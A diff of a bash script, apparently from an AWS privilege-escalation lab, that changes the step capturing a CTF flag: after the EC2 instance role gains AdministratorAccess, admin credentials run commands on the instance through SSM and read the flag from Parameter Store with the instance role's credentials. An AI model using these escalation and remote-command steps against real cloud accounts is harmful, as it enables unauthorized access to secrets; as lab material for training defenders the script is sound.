@@ -655,20 +655,23 @@ fi
 echo ""
 
 # [EXPLOIT]
-# Step 14: Capture the CTF flag
-# The instance role now has AdministratorAccess attached, which grants ssm:GetParameter
-# implicitly. Use the admin creds (which drive SSM commands on the EC2) to read the
-# scenario flag from SSM Parameter Store.
+# Step 14: Capture the CTF flag from the now-elevated instance role on the EC2.
+# AdministratorAccess (just attached to the instance role) grants ssm:GetParameter
+# implicitly. Admin creds drive the SSM channel only (RCE simulation); the actual
+# GetParameter call runs on the EC2 using the instance role's IMDS credentials,
+# proving the elevated principal can reach the flag.
 use_admin_creds
 echo -e "${YELLOW}Step 14: Capturing CTF flag from SSM Parameter Store${NC}"
 FLAG_PARAM_NAME="/pathfinding-labs/flags/ecs-007-to-admin"
-show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
-FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --region "$AWS_REGION" --query 'Parameter.Value' --output text 2>/dev/null)
+show_attack_cmd "Attacker (instance role now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+ssm_exec "aws ssm get-parameter --name $FLAG_PARAM_NAME --region $AWS_REGION --query 'Parameter.Value' --output text"
 
-if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+if [ $SSM_EXIT_CODE -eq 0 ] && [ -n "$SSM_OUTPUT" ] && [ "$SSM_OUTPUT" != "None" ]; then
+    FLAG_VALUE=$(echo "$SSM_OUTPUT" | tr -d '[:space:]')
     echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
 else
     echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    echo "$SSM_OUTPUT"
     exit 1
 fi
 echo ""
